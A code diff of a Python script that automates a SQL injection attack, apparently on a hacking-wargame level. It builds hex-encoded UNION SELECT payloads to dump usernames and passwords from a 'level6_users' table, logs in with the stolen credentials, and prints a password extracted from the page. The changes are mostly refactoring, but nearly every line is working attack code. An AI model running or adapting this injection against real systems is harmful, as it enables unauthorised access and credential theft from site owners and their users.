@@ -5,7 +5,6 @@ import tigers as tg
 
 def str_to_hex(s: str) -> str:
     return '0x' + (s.encode('utf-8')).hex()
-    
 
 
 def main():
@@ -30,27 +29,20 @@ def main():
     cook = dict(level6login=cooks['level6login'])
 
     # Counting the number of columns
-    p = "' union select username,username,password,password,password from level6_users where status=1 #"
+    p = f"' union select username,username,password,password,password from {base_name} where status=1 #"
     h = str_to_hex(p)
     print(h)
 
-    
-    #param = dict(user=f'0 union select 1,{h},3,4,5 from {base_name} where status=1')
-    
-    #response = tg.get_request(url, param, cook)
-    #print(response)
-    
     html_visible = tg.get_request(url, dict(user='1'), cook)
- 
+    p = f"0 union select 1,{h},3,4,5 from {base_name} where status=1"
+    data = dict(user=p)
     keys = tg.find_param(url, len(finds), html_visible,
-                         f'0 union select 1,{h},3,4,5 from {base_name} where status=1',
-                         'user', cook)   
-    print('keys', keys)
-    
+                         data, cook)
+
     # Authorization
     data = dict(user=keys[0], password=keys[1], login='Login')
-    response = tg.get_request(url, data, cook, method='post')     
-     
+    response = tg.get_request(url, data, cook, method='post')
+
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
